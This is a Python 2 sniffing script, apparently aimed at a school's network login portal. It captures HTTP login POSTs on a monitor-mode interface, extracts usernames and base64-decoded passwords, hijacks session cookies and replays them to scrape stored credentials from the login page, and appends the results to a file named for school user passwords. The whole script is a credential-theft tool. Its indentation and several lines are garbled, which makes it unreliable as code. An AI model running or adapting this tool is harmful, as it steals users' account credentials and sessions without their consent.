import requests

import scapy_http.http as http

from scapy.all import *

from lxml import etree

iface ='mon0'

url = "http://1.1.1.3:801/login.php"

ac_id=1&""

path = "/home/add/Desktop/"

def prn(pkt):

    data = None

    headers = None

#stat ==> ap

    if pkt.haslayer(http.HTTPRequest):

#if post the username password

        if pkt.Method == 'POST' and 'username' in pkt.load:

            dt = {i.split("=")[0]:i.split("=")[1] for i in pkt.load.split("&")}

            data = ":::".join((dt["username"], dt['password'][3:].decode("base64"))) + '\n'

            print(dt['username'],dt['password'])



#if has cookie 

        elif pkt.Cookie != None: headers = {'Cookie':pkt.Cookie} #ap ==> stat elif pkt.haslayer(http.HTTPResponse) and 'Set-Cookie' in pkt.load:

#if cookie is set 

                a = [i for i in pkt.load.split("\r\n") if 'Set-Cookie' in i]

                headers = {'Cookie':a[0].split(": ")[1]}



#request for the password with cookie

        if headers != None:

            try:

            con = requests.get(url, headers=headers).content data =":::".join(etree.HTML(con).xpath("//input//@value")[6:8])+'\n'

            print '[+]Get! Cookie:%s'%headers['Cookie']

        except Exception,e:

print e



if data != None:

with open(path + "schoolUserPwd.txt", "a") as txt:

txt.write(data) 



def main():

try: 

sniff(iface=iface, prn=prn, filter="ip host 10.xxx.xx.xx", store=0) 

#sniff(offline=path + "44335.pcap", prn=prn, filter="ip 

host 10.xxx.xx.xx") 

except KeyboardInterrupt, e: 

print "quitting"



if __name__ == '__main__':

main()